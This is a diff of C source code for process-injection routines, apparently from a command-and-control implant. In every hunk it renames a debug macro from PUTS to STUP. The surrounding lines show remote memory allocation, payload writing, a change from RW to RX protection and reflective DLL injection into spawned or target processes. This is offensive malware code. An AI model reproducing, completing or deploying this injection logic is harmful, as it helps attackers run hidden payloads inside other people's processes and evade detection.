@@ -66,7 +66,7 @@ DWORD Inject(
 
     /* check the architecture matches */
     if ( x64 && Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
-        PUTS( "The OS is x86!" )
+        STUP( "The OS is x86!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
     }
@@ -74,18 +74,18 @@ DWORD Inject(
     IsWow64 = ProcessIsWow( Process );
 
     if ( x64 && IsWow64 ) {
-        PUTS( "The process target process is x86!" )
+        STUP( "The process target process is x86!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
     } else if ( ! x64 && Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
-        PUTS( "The process target process is x64!" )
+        STUP( "The process target process is x64!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
     }
 
     /* allocate memory in the remote process */
     if ( ! ( Memory = MmVirtualAlloc( DX_MEM_DEFAULT, Process, Size, PAGE_READWRITE ) ) ) {
-        PUTS( "[INJECT] Failed allocating memory in remote process" )
+        STUP( "[INJECT] Failed allocating memory in remote process" )
         goto END;
     } else {
         PRINTF( "[INJECT] Allocated memory in the remote process: %p\n", Memory )
@@ -93,7 +93,7 @@ DWORD Inject(
 
     /* write payload into remote process memory */
     if ( ! ( MmVirtualWrite( Process, Memory, Payload, Size ) ) ) {
-        PUTS( "[INJECT] Failed to write payload into remote process" )
+        STUP( "[INJECT] Failed to write payload into remote process" )
         goto END;
     } else {
         PRINTF( "[INJECT] Wrote payload into remote process: %d written\n", Size )
@@ -101,10 +101,10 @@ DWORD Inject(
 
     /* change allocated memory from RW to RX */
     if ( ! ( MmVirtualProtect( DX_MEM_SYSCALL, Process, Memory, Size, PAGE_EXECUTE_READ ) ) ) {
-        PUTS( "[INJECT] Failed to change memory protection" )
+        STUP( "[INJECT] Failed to change memory protection" )
         goto END;
     } else {
-        PUTS( "[INJECT] Changed memory protection from RW to RX" )
+        STUP( "[INJECT] Changed memory protection from RW to RX" )
     }
 
     /* check if any args has been specified */
@@ -112,7 +112,7 @@ DWORD Inject(
     {
         /* allocate memory in the remote process */
         if ( ! ( Param = MmVirtualAlloc( DX_MEM_DEFAULT, Process, Argc, PAGE_READWRITE ) ) ) {
-            PUTS( "[INJECT] Failed allocating argument memory in remote process" )
+            STUP( "[INJECT] Failed allocating argument memory in remote process" )
             goto END;
         } else {
             PRINTF( "[INJECT] Allocated argument memory in the remote process: %p\n", Param )
@@ -120,7 +120,7 @@ DWORD Inject(
 
         /* write payload into remote process memory */
         if ( ! ( MmVirtualWrite( Process, Param, Argv, Argc ) ) ) {
-            PUTS( "[INJECT] Failed to write argument into remote process" )
+            STUP( "[INJECT] Failed to write argument into remote process" )
             goto END;
         } else {
             PRINTF( "[INJECT] Wrote argument into remote process: %d written\n", Argc )
@@ -136,7 +136,7 @@ DWORD Inject(
     }
 
 END:
-    PUTS( "[INJECT] End of function. Cleanup start now" )
+    STUP( "[INJECT] End of function. Cleanup start now" )
 
     /* if we failed to inject the lets free up allocated memory */
     if ( Status == INJECT_ERROR_FAILED )
@@ -189,7 +189,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
 
     if( ! DllBuffer || ! DllLength || ! hTargetProcess )
     {
-        PUTS( "Params == NULL" )
+        STUP( "Params == NULL" )
         ReturnValue = -1;
         goto Cleanup;
     }
@@ -199,7 +199,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         x64 = FALSE;
         if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
         {
-            PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
+            STUP( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
             return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
         }
     }
@@ -207,18 +207,18 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     {
         if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) // check if dll is x64
         {
-            PUTS( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
+            STUP( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
             return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
         }
     }
 
     if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
-        PUTS( "The DLL has a Reflective Loader already defined" );
+        STUP( "The DLL has a Reflective Loader already defined" );
         HasRDll     = TRUE;
         FullDll     = DllBuffer;
         FullDllSize = DllLength;
     } else {
-        PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
+        STUP( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
         HasRDll     = FALSE;
         FullDll     = Instance->Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
         FullDllSize = DllLdrSize + DllLength;
@@ -239,17 +239,17 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
-                PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
+                STUP( "NtWriteVirtualMemory: Failed to write memory for parameters" )
                 PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                 ReturnValue = NtStatus;
                 goto Cleanup;
             }
             else
-                PUTS( "Successful wrote params into remote library memory" );
+                STUP( "Successful wrote params into remote library memory" );
         }
         else
         {
-            PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
+            STUP( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
             PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             ReturnValue = -1;
             goto Cleanup;
@@ -260,7 +260,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     MemLibraryBuffer = MmVirtualAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
     if ( MemLibraryBuffer )
     {
-        PUTS( "[+] NtAllocateVirtualMemory: success" );
+        STUP( "[+] NtAllocateVirtualMemory: success" );
         if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
             // TODO: check to get the .text section and size of it
@@ -290,7 +290,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             }
             else
             {
-                PUTS("[-] NtProtectVirtualMemory: failed")
+                STUP("[-] NtProtectVirtualMemory: failed")
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 ReturnValue = -1;
                 goto Cleanup;
@@ -340,7 +340,7 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
         Result = DllInjectReflective( ProcessInfo.hProcess, DllLdr, DllLdrSize, DllBuffer, DllLength, Parameter, ParamSize, ctx );
         if ( Result != 0 )
         {
-            PUTS( "Failed" )
+            STUP( "Failed" )
             ProcessTerminate( ProcessInfo.hProcess, 0 );
             SysNtClose( ProcessInfo.hProcess );
             SysNtClose( ProcessInfo.hThread );
